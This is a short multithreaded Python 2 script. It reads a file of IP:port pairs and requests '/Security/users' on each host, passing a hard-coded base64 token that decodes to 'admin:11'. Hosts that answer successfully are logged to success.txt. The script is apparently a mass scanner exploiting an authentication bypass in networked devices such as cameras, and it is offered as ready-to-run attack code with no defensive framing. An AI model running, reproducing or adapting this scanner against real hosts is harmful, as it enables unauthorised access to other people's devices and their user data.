import urllib
import urllib2
import requests
import threading
import exceptions
import time


requestRate = 1
g_max_thread = 200

_ip_list = []

g_host_file_path = 'result_ip_port.txt'
with open(g_host_file_path, 'r') as f_h:
    for line in f_h.readlines():
        _ip_list.append(line)

g_result_file_path = 'success.txt'
g_f = open(g_result_file_path, 'a')

g_result_file_401 = '401.txt'
g_e4 = open(g_result_file_401, 'a')

g_threadLock = threading.Lock()


def success_write_file_s(_h, con):
    g_threadLock.acquire()
    _h.write(con)
    g_threadLock.release()


def noauth_write_file_s(_h, con):
    success_write_file_s(_h, con)


def generate_req(reqSession, __f_url, __url, __port):
    requestCounter = 0
    _f_url = ''
    while requestCounter < requestRate:
        try:
            response1 = reqSession.get(__f_url, timeout=5)
            _f_url = __url + ':' + str(__port) + '\n'
            # success_write_file_s(g_f,str(response1))
            if 200 == response1.status_code:
                success_write_file_s(g_f, _f_url)
            elif 401 == response1.status_code:
                noauth_write_file_s(g_e4, _f_url)
            else:
                pass
                # print 'error:' + _f_url
            # print 'ok:' + _success_url
        except Exception, e:
            _fail_url = __url + ':' + str(__port) + '\n'
            # print 'error' + _fail_url
            # print exceptions.ConnectionError;
        requestCounter += 1


def wait_thread():
    for th in threading.enumerate():
        if th != threading.current_thread():
            th.join()


def main():

    i = 0
    total = 0
    t_count = len(_ip_list)

    for _l in _ip_list:
        _l = _l.replace('\n', '')
        _url_list = _l.split(':')
        _url = _url_list[0]
        _port = _url_list[1]
        _get_user = '/Security/users?auth=YWRtaW46MTEK'
        _full_url = 'http://' + _url + ':' + str(_port) + _get_user

        __s1 = requests.session()
        __th = threading.Thread(
            target=generate_req, args=(__s1, _full_url, _url, _port))
        __th.start()
        i += 1
        if i > g_max_thread:
            total = total + i
            i = 0
            print 'threading.active_count():' + str(threading.active_count())
            wait_thread()
            print '[' + str(total) + '/' + str(t_count) + ']'

    print('Done')
    g_f.close()

if __name__ == '__main__':
    main()
